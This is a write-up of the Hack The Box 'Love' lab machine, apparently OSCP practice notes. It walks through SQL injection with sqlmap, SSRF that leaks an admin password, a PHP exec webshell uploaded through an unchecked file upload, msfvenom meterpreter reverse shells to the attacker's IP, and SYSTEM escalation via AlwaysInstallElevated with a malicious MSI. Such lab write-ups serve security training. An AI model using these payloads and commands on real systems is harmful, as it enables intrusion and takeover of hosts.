# Love
###### tags: `OSCP`
https://www.hackthebox.eu/home/machines/profile/344

![](https://i.imgur.com/IAl9Fd8.png)

First connect to Hack The Box vpn: 
```shell
openvpn {username}.ovpn
```
![](https://i.imgur.com/2U1WKQP.png)

Seems that my machine is `10.10.14.41`

Then check the target machine
```shell
nmap -sS -sV -A -p- -oN NmapLove.txt 10.10.10.239
```

![](https://i.imgur.com/wVHoDEg.png)

Here we get several web service and domain name: 80(love.htb), 443(staging.love.htb), 5000

Prepare if there's AD exploit in need, let's add domain to host.
```shell
echo 10.10.10.239 love.htb staging.love.htb > /etc/hosts
```

For `http://love.htb`, we get a voting system.

![](https://i.imgur.com/g9B04UW.png)

I cannot find any clue from page's source, so I just use the website title to search with google and I found:
https://www.sourcecodester.com/php/12306/voting-system-using-php.html

![](https://i.imgur.com/vltlzA9.png)

Seems highly similar, use `voting system` as keyword in exploit-db, I found several results.

![](https://i.imgur.com/iK2IkYP.png)

Voting System 1.0 - Time based SQLI (Unauthenticated SQL injection):
https://www.exploit-db.com/exploits/49817
![](https://i.imgur.com/6MXiZgS.png)

Save the request as `love.htb.login`, and then use sqlmap to test it.
```shell
python3 sqlmap.py --dbms=mysql --batch --level=1 --risk=3 -r love.htb.login -p voter
```

![](https://i.imgur.com/L4LEQsd.png)

We in, then we try to find out if any password store in plain text.

![](https://i.imgur.com/x1NYnqt.png)

Let's check `admin` table.

![](https://i.imgur.com/mldfvlW.png)

Here we got the cred: username: `admin` password hash:`$2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC`
This password has been salted, we need to crack it.

![](https://i.imgur.com/qMDTosV.png)

Seems is bcrypt hash, let use hashcat to crack it.

```shell
hashcat -m 3200 -a 0 -o cracked.txt --force adminhash.txt /usr/share/wordlists/rockyou.txt
```

Seems the password is not that weak for us to crack it.

Let's try another vuln, Voting System 1.0 - Remote Code Execution (Unauthenticated):
https://www.exploit-db.com/exploits/49846

![](https://i.imgur.com/3VSjvMx.png)

It's just not work according to session index: `admin` is not set. We still need to find out the password to login.

For `http://staging.love.htb`, we get another website.

![](https://i.imgur.com/0Q8ztCM.png)

```shell
dirb http://staging.love.htb/
```

![](https://i.imgur.com/PGBsvpi.png)

Nothing special.

Let's manually brwose the web, there's a demo page `beta.php`, we get a SSRF? service.

![](https://i.imgur.com/AkyRZvS.png)

For `http://love.htb:5000`, we get third one.

![](https://i.imgur.com/1IG0CIm.png)

Insert the forbidden page to the SSRF provide by `http://staging.love.htb`

![](https://i.imgur.com/gJlqoIr.png)

I got the admin credential:
`admin | @LoveIsInTheAir!!!!`

![](https://i.imgur.com/GtFsOdM.png)

With official document, we know the control panel's URL:
`http://love.htb/admin/index.php`

![](https://i.imgur.com/QKeHpCt.png)

We now need to find a upload point to abuse if it doesn't check the file type.

![](https://i.imgur.com/LreMa1d.png)

Classic, upload the shell in user photo.

![](https://i.imgur.com/ob4Hbbu.png)

With previous infomation from exploit-db, `Voting System 1.0 - Remote Code Execution (Unauthenticated)`, we now that file might store in `/images/`

![](https://i.imgur.com/SndxRPX.png)

Now we can try to get the webshell run.

![](https://i.imgur.com/XNVvhJt.png)

`eval` is reserve symbol on this php version.

Try another:
```php
// or download a reverse shell and modified with nessary change.
// https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php
<?php
    if(isset($_GET['cmd']))
    {
        echo exec($_GET['cmd']);
    }
?>
```



![](https://i.imgur.com/hzvHVEg.png)

Now we get the username: `phoebe`, let's try `systeminfo` and notice that it's `Windows 10`.

So we can generate the path to the user flag on desktop:
`type c:\users\phoebe\Desktop\user.txt`

![](https://i.imgur.com/lsiYKg1.png)

Now, for root privilege, we need to upload the exploit suggester like: `winPEAS`, `windows exploit suggester` ...etc.

So we need to get a more reliable reverse shell, use `msfvenom` to generate the payload.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.41 LPORT=8888 -f exe > shell.exe
```

![](https://i.imgur.com/NZ8GI2v.png)

Upload the `shell.exe` with same file upload vuln. 

![](https://i.imgur.com/daYOOlx.png)

Now use the previous webshell to execute the reverse shell.

Open `msfconsole` and create a handler:
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.41
set LPORT 8888
exploit
```

![](https://i.imgur.com/hTiBgge.png)

Now we get a reliable shell, let's try to download [winPEAS.exe](https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe) and upload to the server.

```
upload winPEASx64.exe
shell
winPEASx64.exe
exit
```

We get serveral suggestion (in red color).

![](https://i.imgur.com/5kQ6QBa.png)

```
Checking AlwaysInstallElevated
    https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
        AlwaysInstallElevated set to 1 in HKLM!
        AlwaysInstallElevated set to 1 in HKCU!
```
According to this [guide](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated), these permissions allow us to install `*.msi` files as `NT Authority\SYSTEM`. As the guide details, we generate a malicious `.msi` msi file using `msfvenom`. This malicious installer will create a backdoor with administrator privilege. 

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.41 LPORT=8787 -f msi > shell.msi
```

![](https://i.imgur.com/kVbYW0X.png)

Now, upload the new .msi payload.

```
upload shell.msi
shell
shell.msi
exit
background
```

![](https://i.imgur.com/r9oNQZS.png)

Background the `sessions 1`, let's create the second listener for .msi shell
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.41
set LPORT 8787
exploit
```

We get admin privilege, check the flag.

![](https://i.imgur.com/FjCrkrc.png)
